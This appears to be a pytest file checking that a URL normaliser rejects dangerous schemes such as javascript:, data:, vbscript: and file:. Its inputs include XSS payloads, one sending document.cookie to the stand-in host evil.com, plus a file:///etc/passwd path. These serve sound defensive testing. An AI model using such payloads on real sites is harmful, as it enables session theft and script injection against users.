"""Tests for dangerous URL scheme rejection."""

import pytest
from app.services.normalize import normalize_url


class TestDangerousSchemes:
    """Test that dangerous URL schemes are rejected."""

    def test_javascript_scheme_rejected(self):
        """javascript: URLs should be rejected as dangerous."""
        result = normalize_url("javascript:alert(1)")
        assert result.ok is False
        assert result.error == "dangerous_scheme"

    def test_javascript_scheme_with_content_rejected(self):
        """javascript: URLs with complex payloads should be rejected."""
        result = normalize_url("javascript:document.location='http://evil.com/'+document.cookie")
        assert result.ok is False
        assert result.error == "dangerous_scheme"

    def test_data_scheme_rejected(self):
        """data: URLs should be rejected as dangerous."""
        result = normalize_url("data:text/html,<script>alert(1)</script>")
        assert result.ok is False
        assert result.error == "dangerous_scheme"

    def test_data_scheme_base64_rejected(self):
        """data: URLs with base64 encoding should be rejected."""
        result = normalize_url("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==")
        assert result.ok is False
        assert result.error == "dangerous_scheme"

    def test_vbscript_scheme_rejected(self):
        """vbscript: URLs should be rejected as dangerous."""
        result = normalize_url("vbscript:msgbox('xss')")
        assert result.ok is False
        assert result.error == "dangerous_scheme"

    def test_file_scheme_rejected(self):
        """file: URLs should be rejected as dangerous."""
        result = normalize_url("file:///etc/passwd")
        assert result.ok is False
        assert result.error == "dangerous_scheme"

    def test_http_scheme_allowed(self):
        """http: URLs should be allowed (but flagged as insecure by signal)."""
        result = normalize_url("http://example.com")
        assert result.ok is True
        assert result.scheme == "http"

    def test_https_scheme_allowed(self):
        """https: URLs should be allowed."""
        result = normalize_url("https://example.com")
        assert result.ok is True
        assert result.scheme == "https"

    def test_ftp_scheme_unsupported(self):
        """ftp: URLs should be rejected as unsupported (not dangerous)."""
        result = normalize_url("ftp://files.example.com/file.txt")
        assert result.ok is False
        assert result.error == "unsupported_scheme"

    def test_mailto_scheme_unsupported(self):
        """mailto: URLs should be rejected as unsupported (not dangerous)."""
        result = normalize_url("mailto:test@example.com")
        assert result.ok is False
        assert result.error == "unsupported_scheme"

    def test_case_insensitive_dangerous_scheme(self):
        """Dangerous schemes should be detected case-insensitively."""
        result = normalize_url("JAVASCRIPT:alert(1)")
        assert result.ok is False
        assert result.error == "dangerous_scheme"

        result = normalize_url("JavaScript:alert(1)")
        assert result.ok is False
        assert result.error == "dangerous_scheme"

    def test_data_image_rejected(self):
        """data: URLs for images should also be rejected (can contain exploits)."""
        result = normalize_url("data:image/svg+xml,<svg onload=alert(1)>")
        assert result.ok is False
        assert result.error == "dangerous_scheme"
